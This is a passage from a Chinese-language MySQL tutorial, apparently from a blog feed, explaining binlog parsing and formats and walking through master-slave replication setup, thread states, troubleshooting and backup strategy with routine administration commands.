p5ɎX\u0002\u0001D9\u0001\u0004\u001a\u0001\u0006\u0003std\u0004!testB 解析指定库的binlog\n范例：利用 mysqlbinlog -d 参数解析指定库的binlog日志\n$ cat -n 10 1.sql 29 # at 313 # \u0026lt;=对应的位置 # #170130 13:03:49 2017年01月30日 13:03:49秒 对应的时间 # end_log_pos 结束的位置，对应下面开始的位置 30 #170130 13:03:49 server id 1 end_log_pos 341 Intvar 31 SET INSERT_ID=3000001/*!*/; 32 # at 341 33 #170130 13:03:49 server id 1 end_log_pos 543 Query thread_id=1 exec_time=0 error_code=0 34 use `test`/*!*/; 35 SET TIMESTAMP=1485752629/*!*/; 36 insert into test1(num1,num2,num3) values( NAME_CONST('rand_num1',3127167), NAME_CONST('rand_num2',3952885), NAME_CONST('rand_num3',382922)) 结论：mysqlbinlog 工具分库导出 binlog，如果使用 -d 参数，那更新数据时，必须有use database，才能分出指定库的binlog，例如：\nuse test; insert into test values (1,'test'); 官方资料：mysqlbinlog — Utility for Processing Binary Log Files\n--database=db_name, -d db_name This option causes mysqlbinlog to output entries from the binary log (local log only) that occur while db_name is been selected as the default database by USE. 按照位置截取：精准，时间长\nmysqlbinlog mysqlbin.000020 --start-position=200 --stop-position=450 -r pos.sql # 指定开始位置，不指定结束位置。结束位置为文件结尾 mysqlbinlog mysqlbin.000020 --start-position=200 -r pos.sql # 指定结束位置，不指定开始位置，开始位置为文件开头 mysqlbinlog mysqlbin.000020 --stop-position=450 -r pos.sql 按时间截取：模糊、不准，会丢失数据\nmysqlbinlog mysql-bin.0020 \\ --start-datatime='1912-10-10 10:10:10' \\ --stop-datetime='2015-10-10 10:10:10' \\ -r time.sql mysqlbinlog命令 把 binlog 解析为sql语句（包含位置和时间点） -d 参数根据指定库拆分binlog（拆分单表binlog可通过SQL关键字过滤） 通过位置参数截取部分binlog：--start-position=111 --stop-position=500，精确定位取部分内容。 通过时间参数截取部分binglog：--start-datetime='2016-10-10 10:10:10' -r fileName，相当于重定向 “\u0026gt;” 解析 row 级别 binlog 日志方法 mysqlbinlog --base64-output=decode-rows -v mysql-bin.000004 binlog三种模式 Row Level\n不记录sql语句上下文相关信息，仅保存哪条记录被修改。\n优点：binlog中可以不记录执行的sql语句的上下文相关的信息，仅需要记录那一条记录被修改成什么了。所以rowlevel的日志内容会非常清楚的记录下每一行数据修改的细节。而且不会出现某些特定情况下的存储过程，或function，以及trigger的调用和触发无法被正确复制的问题\n缺点：所有的执行的语句当记录到日志中的时候，都将以每行记录的修改来记录，这样可能会产生大量的日志内容,比如一条update语句，修改多条记录，则binlog中每一条修改都会有记录，这样造成binlog日志量会很大，特别是当执行alter table之类的语句的时候，由于表结构修改，每条记录都发生改变，那么该表每一条记录都会记录到日志中。\nStatement Level\n每一条会修改数据的sql都会记录在binlog中。\n优点：不需要记录每一行的变化，减少了binlog日志量，节约了IO，提高性能。(相比row能节约多少性能与日志量，这个取决于应用的SQL情况，正常同一条记录修改或者插入row格式所产生的日志量还小于Statement产生的日志量，但是考虑到如果带条件的update操作，以及整表删除，alter表等操作，ROW格式会产生大量日志，因此在考虑是否使用ROW格式日志时应该跟据应用的实际情况，其所产生的日志量会增加多少，以及带来的IO性能问题。)\n缺点：由于记录的只是执行语句，为了这些语句能在slave上正确运行，因此还必须记录每条语句在执行的时候的一些相关信息，以保证所有语句能在slave得到和在master端执行时候相同 的结果。另外mysql 的复制,像一些特定函数功能，slave可与master上要保持一致会有很多相关问题(如sleep()函数， last_insert_id()，以及user-defined functions(udf)会出现问题).\nMixed Level\n是以上两种level的混合使用，一般的语句修改使用statment格式保存binlog，如一些函数，statement无法完成主从复制的操作，则采用 row 格式保存binlog，MySQL会根据执行的每一条具体的sql语句来区分对待记录的日志形式，也就是在Statement和Row之间选择一种。新版本的MySQL中队row level模式也被做了优化，并不是所有的修改都会以row level来记录，像遇到表结构变更的时候就会以statement模式来记录。至于update或者delete等修改数据的语句，还是会记录所有行的变更。\n生产环境如何选择binlog的模式\n互联网公司，使用MySQL的功能相对少（存储过程、触发器、函数），选择默认的语句模式。 公司如果用到使用MySQL的特殊功能（存储过程、触发器、函数）。则选择Mixed。 公司如果公道使用MySQL的特殊功能（存储过程、触发器、函数），又希望数据最大化一致，此时最好用row模式 设置MySQL binlog的格式 MariaDB \u0026gt;show global variables like '%binlog_format%'; +---------------+-----------+ | Variable_name | Value | +---------------+-----------+ | binlog_format | STATEMENT | +---------------+-----------+ MariaDB \u0026gt;set global binlog_format='row'; MariaDB \u0026gt;show global variables like '%binlog_format%'; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | binlog_format | ROW | +---------------+-------+ 永久生效\nlog-bin=mysql-bin binlog_format=STATEMENT binlog_format=MIXED binlog_format=ROW 测试ROW模式下的binlog记录日志情况\n22 # at 366 23 # at 1377 24 # at 2392 25 # at 3410 26 # at 4420 27 # at 5428 28 #170202 6:29:13 server id 1 end_log_pos 366 Table_map: `test`.`test1` mapped to number 35 25 # at 3410 26 # at 4420 27 # at 5428 28 #170202 6:29:13 server id 1 end_log_pos 366 Table_map: `test`.`test1` mapped to number 35 29 #170202 6:29:13 server id 1 end_log_pos 1377 Update_rows: table id 35 30 #170202 6:29:13 server id 1 end_log_pos 2392 Update_rows: table id 35 31 #170202 6:29:13 server id 1 end_log_pos 3410 Update_rows: table id 35 32 #170202 6:29:13 server id 1 end_log_pos 4420 Update_rows: table id 35 33 #170202 6:29:13 server id 1 end_log_pos 5428 Update_rows: table id 35 34 #170202 6:29:13 server id 1 end_log_pos 6002 Update_rows: table id 35 flags: STMT_END_F 35 ### UPDATE `test`.`test1` 36 ### WHERE 37 ### @1=1 38 ### @2='3941282' 39 ### @3='3149717' 40 ### @4='3924740' 41 ### SET 42 ### @1=1 43 ### @2='3941282' 44 ### @3='test' 45 ### @4='3924740' 46 ### UPDATE `test`.`test1` 47 ### WHERE 48 ### @1=2 49 ### @2='174549' 50 ### @3='9098525' 51 ### @4='4968976' 52 ### SET 53 ### @1=2 54 ### @2='174549' 55 ### @3='test' 56 ### @4='4968976' 57 ### UPDATE `test`.`test1` 58 ### WHERE 59 ### @1=3 60 ### @2='7549308' 61 ### @3='2839610' 62 ### @4='1550126' 63 ### SET 64 ### @1=3 65 ### @2='7549308' 66 ### @3='test' 67 ### @4='1550126' statement日志记录\n# at 313 #170202 6:36:27 server id 1 end_log_pos 403 Query\tthread_id=1\texec_time=0\terror_code=0 use `test`/*!*/; SET TIMESTAMP=1485988587/*!*/; update test1 set num3='aa1' /*!*/; # at 403 #170202 6:36:27 server id 1 end_log_pos 430 Xid = 11 COMMIT/*!*/; DELIMITER ; # End of log file 1197\nERROR 1197 (HY000) at line 4: Multi-statement transaction required more than 'max_binlog_cache_size' bytes of storage; increase this mysqld variable and try again 原因：row 格式的 binlog 的特点：在 row 模式下，所有的执行的语句当记录到日志中的时候，都将以每行记录的修改来记录，这样可能会产生大量的日志内容。所以会造成binlog cache因为过小而中断。\n解决设置大的cache\n","permalink":"https://www.oomkill.com/2017/05/ch04-mysql-log/","summary":"","title":"ch04 - MySQL数据库服务日志类型"},{"content":"Linux文件数据同步方案 在讲解MySQL主从复制之前，先回忆下，前面将结果的普通文件（磁盘上的文件）的同步方法。\n文件级别的异机同步方案\nscp/sftp/nc命令可以实现远程数据同步。 搭建ftp/http/svn/nfs服务器，然后在客户端上也可以把数据同步到服务器。 搭建samba文件共享服务，然后在客户端上也可以把数据同步到服务器。 利用rsync/csync2/union等均可以实现数据同步。 提示：union可实现双向同步，csync2可实现多机同步。\n​\t以上文件同步方式如果结合定时任务或innotify sersync等功能，可以实现定时以及实时的数据同步。\n扩展思想：文件级别复制也可以利用mysql,mongodb等软件作为容器实现。\n扩展思想：程序向两个服务器同时写数据，双写就是一个同步机制。\n​\t特点：简单、方便、效率和文件系统级别要差一些，但是被同步的节点可以提供访问。\n软件的自身同步机制（mysql、oracle、mongdb、ttserver、redis\u0026hellip;..），文件放到数据库，听不到从库，再把文件拿出来。 文件系统级别的异机同步方案\ndrbd基于文件系统同步，相当于网络RAID1，可以同步几乎任何业务数据。\nmysql数据的官方推荐drbd同步数据，所有单点服务例如：NFS，MFS(DRBD)，MySQL等度可以用drbd做复制，效率很高，缺点：备机服务不可用。\n数据库同步方案\n自身同步机制：mysql relication，（逻辑的SQL重写）物理复制方法drbd（丛库不提供读写）。 第三方drbd MySQL主从复制概述 MySQL的主从复制方案，和上述文件及文件系统级别同步是类似的，都是数据的传输。只不过MySQL无需借助第三方工具，而是其自带的同步复制功能，另外一点，MySQL的主从复制并不是磁盘上文件直接同步，而是逻辑的binlog日志绒布到本地在应用执行的过程\nMySQL主从复制是一个异步的复制过程（虽然一般情况下感觉是实时的），数据将从一个MySQL数据库（Master）复制到另一个数据库（Slave），在 mater 与 Slave之 间实现整个主从复制的过程是由三个线程参与完成的。其中有两个线程( SQL和IO )在Slave端，另外一个线程（I/O）在Master端。\n要实现MySQL的主从复制，首先必须打开 Master 端的 binlog 记录功能，否则就无法实现。因为整个复制过程实际上就是Slave从Master端获取Binlog日志，然后在Slave上以相同顺序逐自获取 binlog 日志中所记录的各种SQL操作。\n要打开MySQL的binlog记录功能，可能通过在MySQL的配置文件 my.cnf 中的 mysqld 模块( [mysqld] )标识后的参数部分增加 “log-bin” 参数选项来实现，具体信息如下：\n[mysqld] log-bin = /data/3307/mysql-bin 提示：log-bin需放置在[mysqld]标识后，否则会导致配置复制不成功。\nMySQL数据可支持单向、双向、链式级联等不同场景的复制。在复制过程中，一台服务器充当主服务器（Master），而一个或多个其他的服务器充当从服务器（Slave）。\n复制可以使单向：M==\u0026gt;S，也可以是双向 M\u0026lt;==\u0026gt;M，当然也可以多M环装同步等。\n如果设置了链式级联复制，那么，从（slave）服务器本身除了充当从服务器外，也会同时充当其下面从服务器的主服务器。链式级联复制类似 A==\u0026gt;B==\u0026gt;C==\u0026gt;D 的复制形式。\n下面是MySQL各种同步架构的逻辑图。\n单向主从复制逻辑图，次架构只能在Master端进行数据写入。官方给出Slave最多9，工作中不要超过5\n双向主主同步逻辑图，次架构可以再Master1端或Master2端进行数据写入\n线性级联单向双主同步逻辑图，此架构只能在Master1端进行数据写入\n缺陷：1 ==\u0026gt;3 之间会存在延迟\n环装级联单向多主同步逻辑图，任意一个点都可以写入数据。\n环装级联单向多主多从同步逻辑图，次架构只能在任意一个Master端进行数据写入。\n应对读比较多的情况，将所有的从做成负载均衡，三个主做负载均衡。如果其中一个主断掉，其从节点就成了旧数据\nMySQL官方同步架构图\nMySQL主从复制过程原理 下面简单描述下MySQL Replication的复制原理过程\n在 Slave 服务器上执行 start slave 命令开启主从复制开关，主从复制开始进行。 此时，Slave服务器的 I/O线程 会通过在Master上已经授权的复制用户权限请求连接 Master 服务器，并请求从指定 binlog 日志文件的指定位置（日志文件名和位置就是在配置主从复制服务时执行change master命令指定的）之后开始发送binlog日志内容。 Master服务器接受到来自 Slave服务器 I/O线程 的请求后，其上负责复制的I/O线程会根据Slave服务器I/O线程请求的信息分批读取指定 Binlog 日志文件指定位置之后的 Binlog 日志信息，然后返回给 Slave 端的 I/O线程。返回的信息中除了 Binlog 日志内容外，还有在Master服务器端记录的新的Binlog文件以及在新的Binlog中的下一个指定更新位置。 当Slave服务器的 I/O线程 发送的日志内容及日志文件及位置后，会将 Binlog日志 内容依次写入到 Slave 端自身的 Relay Log（即中继日志）(mysql-relay-bin_xxxxx）端新binlog日志时，能告诉master端服务器需要从新Binlog日志的指定文件及位置开始请求新的binlog日志内容 Slave服务器端的SQL线程会实时地检测本地 Relay Log 中 I/O线程 新增加的日志内容，然后及时地把 Relay Log 文件中的内容解析成SQL语句，并在自身 Slave服务器 上按解析SQL语句的位置顺序执行应用这些SQL语句，并记录当前应用中继日志的文件名及位置点在 **relay-log.info**中。 经过了上面的过程，就可以确保在Master端和Slave端执行了同样的SQL语句。当复制状态正常的情况下，Master端和Slave端的数据是完全一样的。当然，MySQL的复制机制也有一些特殊情况，具体请参考官方的说明。\n图：MySQL主从复制基本原理\nMySQL主从复制原理小结：\n主从复制是异步的逻辑SQL语句级的复制。 复制时，主库有一个I/O线程，从库有两个线程I/O和SQL线程。 实现主从复制的必要条件是主库要开启记录binlog功能。 作为复制的所有MySQL节点的server-id都不能相同 binlog文件只记录对数据库有关的SQL（来自主数据库内容的变更），不记录任何查询（select show）语句。 MySQL主从复制配置 环境准备 MySQL主从复制实践对环境的要求比较简单，可以是单机单数据库多实例的环境，也可以是两台服务器，每个机器上独立数据库的环境。\n$ ss -lnt State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 \\*:3306 \\*:\\* LISTEN 0 128 \\*:3307 \\*:\\* 提示：这里把3306实例作为主库，3307实例作为从库，如果根据前面的内容配置了mysql多实例环境，直接开启多实例环境使用即可。\n定义主从复制需要的服务器角色\n主库及从库IP、端口信息：\nmaster:\t192.168.2.110:3306 slave:\t192.168.2.110:3307 这里的主从复制技术是针对前面的内容以单机数据库多实例环境来讲的。一般情况下，小企业在做常规的主从复制时，主从服务器多数在不同的机器上，并且监听的端口均为默认的3306。虽然不在同一个机器上，但是步骤和过程却是一样的。\n主库部分配置 设置server-id值并开启binlog功能参数\n根据前文介绍的MySQL主从复制原理我们知道，要实现主从复制，关键是要开启binlog日志功能，所以，首先来打开主库的binlog参数。\n[mysqld] server-id=1\t# \u0026lt;=用于同步的每台机器或实例server-id都不能相同\tlog-bin=/data/3306/mysql-bin\t#\u0026lt;=该部分可省略 提示：\n上面的两个参数要放在my.cnf中的 [mysqld] 模块下，否则会出错。\nserver-id 的值使用服务器ip地址最后一个小数点后面数字如：19，目的是避免不同机器或实例ID重复（不适合多实例） 0 \u0026lt; server-id \u0026lt; 232-1的自然数\n要先在 my.cnf 配置文件中查找相关参数，并按要求修改。若不存在再添加参数。切记参数不能重复\n修改my.cnf配置后需要重启数据库，命令为: /data/3306/mysql restart，要确认真正重启了\n检查配置参数后的结果\n$ grep -E 'log-bin|server-id' my.cnf log-bin = /data/3306/mysql-bin server-id = 1 登陆数据库检查参数的更改情况（需重启）\nmysql\u0026gt; show variables like 'server_id'; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | server_id\t| 1 | +---------------+-------+ mysql\u0026gt; show variables like 'log_bin'; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | log_bin | ON | +---------------+-------+ 在主库上建立用于主从复制的账号\n根据主从复制的原理，从库要想和主库同步，必须有一个可以连接主库的账号，并且这个账号是主库上创建的，权限是允许主库的从库连接并同步数据。\n登陆3306实例猪数据库\nmysql -uroot -p111 -S /data/3306/mysql.sock 建立用于从库复制的账号rep：\ngrant replication slave on *.* to 'rep'@'192.168.2.%' identified by '1234'; # relication slave为mysql同步的必须权限，此处不要授权all # *.*表示所有库所有表，也可以指定具体的库和表进行复制，例如shop.test # rep@'192.168.2.%'为同步账号。192.168.2.%为授权网段，使用%表示192.168.2.0网段以rep用户访问 # identified by '1234' 为密码。生产环境要使用复杂密码 mysql\u0026gt; flush privileges; 检查主库复制账号权限\nmysql\u0026gt; show grants for rep@'192.168.2.%'\\G *************************** 1. row *************************** Grants for rep@192.168.2.%: GRANT REPLICATION SLAVE ON *.* TO 'rep'@'192.168.2.%' IDENTIFIED BY PASSWORD '*A4B6157319038724E3560894F7F932C8886EBFCF' 实现对数据库锁表只读\n1. 对主数据库锁表只读（当钱窗口不要关闭）的命令：\nflush table with read lock; # 锁表后新建窗口查看mysql此时是不能插入数据的 提示：在引擎不同的情况，这个锁表命令的时间会受下面参数的控制。锁表时，如果草果设置时间不操作会自动解锁。\n默认情况下自动解锁的市场参数值如下：\nmysql\u0026gt; show variables like '%timeout%'; +----------------------------+----------+ | Variable_name | Value | +----------------------------+----------+ | interactive_timeout | 28800 | | wait_timeout | 28800 | +----------------------------+----------+ 2. 锁表后查看主库状态。可通过当前binlog日志文件名和二进制binlog日志偏移量来查看\n注意，show master status;命令显示的信息要记录在案，后面的从库导入全备后，继续和主库复制时就是要从这个位置开始。\nmysql\u0026gt; show master status; +------------------+----------+--------------+------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------+----------+--------------+------------------+ | mysql-bin.000319 | 331 | | | +------------------+----------+--------------+------------------+ mysql -uroot -p111 -S /data/3306/mysql.sock -e 'show master status;' 3. 锁表后，一定要单开一个新的SSH窗口，导出数据库的所有数据，如果数据量很大( 50GB+ )，并且允许停机，可以停库直接打包数据文件迁移，那样还快些\nmysqldump -uroot -p111 \\ -S /data/3306/mysql.sock \\ --events -A -B|gzip \u0026gt;bak.`date +%F.sql.gz` 为了确保导出数据期间，数据库没有数据插入，导库完毕可以再检查下主库状态信息。\n$ mysql -uroot -p111 -S /data/3306/mysql.sock -e 'show master status;' +------------------+----------+--------------+------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------+----------+--------------+------------------+ | mysql-bin.000319 | 331 | | | +------------------+----------+--------------+------------------+ # 若无特殊情况，binlog文件及位置点和锁表后导出数据前是一致的，即没有变化的。 导出数据后，解锁主库，恢复可写，因为主库还要对外提供服务，不能一直锁定不让用户访问。\nunlock tables; # 此时新窗口的写入语句会立刻写入数据 实际上做从库前，无论主库更新多少数据库，最后从库都可以从上面show master status的位置很快赶上主库的进度的。\n将导出数据迁移到从库\n常用scp rsync等，将备份的数据往异地拷贝。\n这里是多实例的主从配置，mysqldum p备份的3306实例的数据和要恢复的3307实例在一台机器上，因此无需异地复制拷贝了，\n1. 设置server-id并关闭binlog功能\n数据库的server-id一般在一套主从复制体系内是唯一的，这里从库的server-id要和主库及其他的从库不同，并且要注释掉从库的binlog参数，如果从库不做级联复制，并且不做备份用，就不要开启binlog，开启了反而会增加从库磁盘I/O等压力。\n如下两种情况需要打开 binlog 功能，记录数据更新的SQL语句\n级联同步 A=\u0026gt;B=\u0026gt;C中间的B时，就要开启binlog\n在从库做数据库备份，数据库备份必须要有全备和binlog日志，才是完整的备份。\n$ grep -E 'server-id|log-bin' my.cnf #log-bin = /data/3307/mysql-bin server-id = 3 提示：\n参数要放在 my.cnf 中的 [mysqld] 模块下，否则会出错。\nserver-id的值可使用服务器ip地址最后一个数字。\n要先在文件中查找相关参数按要求修改。若发现不存在，再添加参数，切记参数不能同步。\n修改完配置后需重启数据库。\n2. 登陆数据库查看参数改变情况\n$ mysql -uroot -S /data/3307/mysql.sock -e 'show variables like \u0026quot;log_bin\u0026quot;;'; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | log_bin | OFF | +---------------+-------+ 3. 将全备恢复到从库\nmysql -uroot -p111 -S /data/3307/mysql.sock \u0026lt; bac.sql 提示：如果备份时使用了-A参数，则在还原数据到3307实例时，登陆3307实例的密码也回合3306主库一致，因为3307的授权表mysql也被覆盖了\n4. 登陆3307从库，配置复制参数\nCHANGE MASTER TO MASTER_HOST='192.168.2.110', MASTER_PORT=3306, MASTER_USER='rep', MASTER_PASSWORD='1234', MASTER_LOG_FILE='mysql-bin.000322', MASTER_LOG_POS=188; CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000322', MASTER_LOG_POS=107; 提示：字符串用单引号括起来，数值不用引号，密码需要。内容前后不能用空格\n主从复制是不是成功，其中最关键的为下面三项状态参数：\n$ mysql -uroot -S /data/3307/mysql.sock -e 'show slave status\\G '|grep -E 'IO_Running|SQL_Running|Seconds_Behind' Slave_IO_Running: Yes Slave_SQL_Running: Yes Seconds_Behind_Master: 0 Slave_IO_Running: Yes，这个是I/O线程状态，I/O线程负责从从库去主库读取binlog日志，并写入从库的中继日志中，状态为Yes表示I/O线程工作正常。 Slave_SQL_Running: Yes，这个是SQL线程状态，SQL线程负责读取中继日志(relay-log)中的数据并转换为SQL语句应用到丛库数据库中，状态为Yes表示I/O线程工作正常。 Seconds_Behind_Master: 0，这个是在复制过程中，丛库比主库延迟的秒数，这个参数很重要，但企业里更准确的判断主从延迟的方法为：在主库写时间戳，然后从库读取时间戳和当前数据库时间的进行比较，从而认定是都延迟。 有关show slave status结果的说明。请参考MySQL手册。\nMySQL主从复制配置步骤小结 MySQL主从复制配置完整步骤如下：\n准备两台数据库环境或者单台多实例环境，确定能正常启动和登陆。 配置my.cnf文件：主库配置 log-bin 和 server-id 参数，从库配置 server-id ，该值不能和主库及其他从库一样，一般不开启从库log-bin功能。注意，配置参数后要重启才能生效。 登陆主库增加从库连接主库同步的账户，例如：rep，并授权replication slave同步的权限。 登陆主库，整库锁表 flush table with read lock（关闭窗口后失效，超时时间到了锁表也失效），然后show master status 查看 binlog 的位置状态。 新开窗口，在Linux命令行备份导出原有的数据库数据，并拷贝到丛库所在的服务器目录。如果数据库数据量很大，并且允许停机，可以停机打包，而不用mysqldump。 导出主库数据后，执行 unlock tablesl; 解锁主库。 把主库导出的数据库恢复到从库。 根据主库的show master status 查看到 binlog 的位置状态，在从库执行 change master to 语句 从库开启复制开关即执行 start slave。 从库 show slave status\\G 快速配置MySQL主从复制\n步骤\n安装好要配置从库的数据库，配置好 log-bin 和 server-id 参数 无需配置主从库 my.cnf 文件，主库 log-bin 和 server-id 参数默认就是配置好的。 登陆主库，增加从库链接主库同步的账户，例如：rep，并授权 replication slave 同步的权限。 使用在半夜通过定时任务备份 mysqldump 带 -x 和 --master-date=1 的命令及参数的全备数据，恢复到从库 在从库执行 change master to.. 语句，无需 binlog 文件及对应位置点。 从库开启同步开关，start slave 从库 show slave status\\G，检查同步状态，并在主库进行更新测试。 MySQL主从复制线程状态说明及用途 MySQL主从复制主库I/O线程状态说明 登陆主数据库查看MySQL线程的同步状态。\nmysql\u0026gt; show processlist\\G; *************************** 1. row *************************** Id: 7 User: rep Host: 192.168.2.110:39610 db: NULL Command: Binlog Dump Time: 57983 State: Master has sent all binlog to slave; waiting for binlog to be updated Info: NULL *************************** 2. row *************************** Id: 11 User: rep Host: 192.168.2.110:39614 db: NULL Command: Binlog Dump Time: 21942 State: Master has sent all binlog to slave; waiting for binlog to be updated Info: NULL *************************** 3. row *************************** Id: 16 User: root Host: localhost db: information_schema Command: Query Time: 0 State: NULL Info: show processlist 3 rows in set (0.00 sec) ERROR: No query specified # 上述两个从库，每个从库对应一个I/O线程 提示：上述状态的意思是线程已经从binlog日志读取所有更新，并已经发送到了从数据库服务器，线程现在为空闲状态，等待由主服务器上二进制日志中的新事件更新\n下表列出主服务器的 binlog Dump线程中State列的最常见状态。如果没有在主服务器上看见任何Binlog Dump线程，则说明复制没有在运行，二进制binlog日志由各种事件组成，一个事件会通常为一个更新加一些其他信息。\n状态 说明 Sending binlog event to slave 线程已经从二进制binlog读取了一个事件并且正将它发送到从服务器 Finished reading on binlog switching to next binlog 线程已经读完二进制binlog日志文件，并且正在打开下一个要发送到从服务器的binlog日志文件 Has sent all binlog to slave;waiting for binlof to be update 线程已经从binlog日志读取所有的更新并已经发送到了从数据库服务器。线程现在为空闲状态，等待由主服务器上二进制binlog日志中的新事件更新。 Waiting to finalize termination 线程停止时发生了一个简单的状态 登陆从数据库查看mysql线程工作状态，从库有两个线程，即I/O和SQL线程。\n下面是从I/O线程的状态。\nmysql\u0026gt; show processlist\\G *************************** 1. row *************************** Id: 7 User: system user Host: db: NULL Command: Connect Time: 33004 State: Waiting for master to send event Info: NULL *************************** 2. row *************************** Id: 8 User: system user Host: db: NULL Command: Connect Time: 3510 State: Slave has read all relay log; waiting for the slave I/O thread to update it Info: NULL *************************** 3. row *************************** 下表列出了从库服务器的I/O线程的state列的最常见的状态。该状态也出现在Slave_IO_State列，有show slave status;显示\n从库I/O线程工作状态 解释说明 Connecting to master 线程正试图连接主服务器 Checking master version 同主服务器之间建立连接后临时出现的状态 Registering slave on master Requesting binlog dump 建立同主服务器之间的连接后立即临时出现的状态。线程向主服务器发送一条请求，索取从请求的二进制binlog日志文件名和位置开始的二进制binlog日志的内容。 Waiting to reconnect after a failed binlogdump request 如果二进制binlog日志转储请求失败，线程进入睡眠状态，然后定期尝试重新连接。可以使用\u0026ndash;master-connect-retry选项指定重试之间的间隔。 Reconnect after a failed binlog dump request 线程正尝试重新连接主服务器。 Waiting for master to sent event 线程已经连接上主服务器，正等待二进制binlog日志事件到达。 Queueing master event to the relay log 线程已经读取一个事件，正将它复制到中继日志供SQL线程来处理 Reconnecting after failed master event read 线程正尝试重新连接主服务器。当连接重新建立后，状态变为 Waiting for master to send event 下面是从库SQL线程的状态\n*************************** 2. row *************************** Id: 8 User: system user Host: db: NULL Command: Connect Time: 5460 State: Slave has read all relay log; waiting for the slave I/O thread to update it Info: NULL 从库SQL线程状态 解释说明 Reading event from the relay log 线程已经从中继日志读取一个事件，可以对事件进行处理了。 Has read all relay log;waiting for the slave I/O thread to update it 线程已经处理了中继日志文件中的所有事件，现在正等待I/O线程将新事件写入中级日志。 Waiting for slave mutex on exit 线程停止时发生的一个很简单的状态。 更多状态在mysql手册6.3章节\n查看MySQL线程同步状态的用途 故障1：主库show master status;没返回状态结果\nmysql\u0026gt; show master status; Empty set (0.00 sec) 解答：上述问题原因是主库binlog功能没有开启或没生效\n故障2：出现Last_IO_Error:Got fatal error 1236 from master when reading date from binary log:\u0026rsquo;\u0026rsquo;\nLast_IO_Error: Got fatal error 1236 from master when reading data from binary log: 'Could not find first log file name in binary log index file' 原因：\n主库停机导致binlog错误 从库执行change master命令时某一个参数的值多了空格，因而产生错误 解决方法\nflush logs; show master status; slave start; show slave status \\G 故障3：Fatal error: The slave I/O thread stops because master and slave have equal MySQL server ids; Last_IO_Error: Fatal error: The slave I/O thread stops because master and slave have equal MySQL server ids; these ids must be different for replication to work (or the --replicate-same-server-id option must be used on slave but this does not always make sense; please check the manual before using it). 原因sever-id与主一致，更改后重启服务器恢复。\n工作中MySQL从库停止复制故障案例 模拟重现故障的能力是运维人员最重要的能力。先从从库创建一个库，然后去主库创建同名的库来模拟数据冲突。\nmysql\u0026gt; show slave status\\G; .... .... Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 1007 Last_SQL_Error: Error 'Can't create database 'test123'; database exists' on query. Default database: 'test123'. Query: 'create database test123 default character set utf8' Replicate_Ignore_Server_Ids: Master_Server_Id: 1 对于该冲突，解决方法1：\nstop slave; # 临时停止同步开关 set global sql_slave_skip_counter=1;# 将同步指针想下移动一个，如果多次不同步，可以重复操作 start slave; mysql\u0026gt; show slave status\\G .... .... Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1 对于普通的互联网业务，上述的移动指针的命令操作带来的问题不是很大。当然要确认不影响公司业务的前提下。\n若是在企业场景下，对当前业务来说，解决主从同步比主从不一致更重要，如果主从数据一致也是很重要的，那就再找个时间恢复下这个从库。\n主从数据不一致更重要还是保持主从同步持续状态更重要，则要根据业务选择。\n这样Slave就会和Master同步了，其关键点为：\nSlave_IO_Running:Yes Slave_SQL_Running:Yes Senconds_Behind_Master # 是否为0 0表示已经同步状态 提示：``set global sql_slave_skip_counter=n` n取值\u0026gt;0，忽略执行N个更新。\n解决方法2：根据可以忽略的错误号事先在配置文件中配置，跳过指定的不同映像业务数据的错误，例如：\nslave-skip-errors=1032,1062,1007 提示：类似由于入库重复导致的失败可以忽略，其他情况是不是可以忽略需要根据不同送死的具体业务来评估\nmysql\u0026gt; show slave status\\G *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event .... .... Slave_IO_Running: Yes Slave_SQL_Running: No Replicate_Do_DB: .... .... Last_SQL_Errno: 1007 Last_SQL_Error: Error 'Can't create database 'zhangsan'; database exists' on query. Default database: 'zhangsan'. Query: 'create database zhangsan' 其他可能引起复制故障的问题：\nMySQL自身的原因及认为重复插入数据。\n不同的数据库版本会引起不同步，低版本到高版本可以，但是高版本不能往低版本同步。\nMySQL的运行错误或者程序BUG。\nbinlog记录模式，例如：row level模式就比默认的语句模式要好。\n让MySQL从库记录binlog日志方法 从库需要记录binlog的应用场景为：当前的从库还要作为其他从库的主库，例如：级联复制或双主互为主从场景的情况下。从库记录binlog日志的方法：\n在从库的 my.cnf 中加入如下参数，然后重启服务生效即可。\nlog-slave-updaes # 必须要有这个参数 log-bin=/data/3306/mysql-bin expire_logs_days=7 # binlog日志过期参数，过期自动删除 MySQL主从复制集群架构的数据备份策略 有了主从复制了，还需要做定时全量加增量备份么？答案是肯定的\n因为，如果主库有语句级误操作（例如：drop database test; ），从库也会这行 drop database test; ，这样MySQL主从库就都删除了该数据。\n把从库作为数据库备份服务器时，备份策略如下：\n高并发业务场景备份时，可以选择在一台数据库上备份（Slave5），把从库作为数据库备份服务器时需要在从库开启 binlog 功能，如图所示 步骤如下\n选择一个不对外提供服务器的从库，这样可以确保和主库更新最接近，专门做数据备份用。 开启从库binlog功能。 备份时可以选择只停止 SQL 线程，停止应用SQL语句到数据库，I/O线程保留工作状态，执行命令为 stop slave sql_thread; ，备份方式可以采取 mysqldump 逻辑备份或者直接物理备份，例如：cp tar（打包目录）工具，或 xtrabackup（第三方的物理备份软件）进行备份，逻辑备份和物理备份的选择，一般是根据总的本分数据了多少进行选择，数据量低于20G，建议选择 mysqldump 逻辑备份方法，安全稳定，最后把全备和 binlog 数据发总到备份服务器上留存\nMySQL主从复制延迟问题原因及解决方案 问题一：一个主库的从库太多，导致复制延迟\n建议从库数量3-5个为宜，要复制的节点数量过多，会导致复制延迟。\n问题二：从库硬件比主库差，导致复制延迟\n查看master和slave的系统配置，可能会因为机器配置的问题，包括磁盘IO、CPU内存等各方面因素曹成复制的延迟，一般发生在高并发大数据量写入场景。\n问题三：慢查询SQL语句过多\n假如一条SQL语句，执行时间是20秒，那么从执行完毕，到从库上能查到数据也至少是20秒，这样就延迟了20秒\nSQL语句的优化一般要作为常规工作不断的监控和优化，如果是单个SQL的写入时间长，可以修改后分多次写入，通过查看慢查询日志或 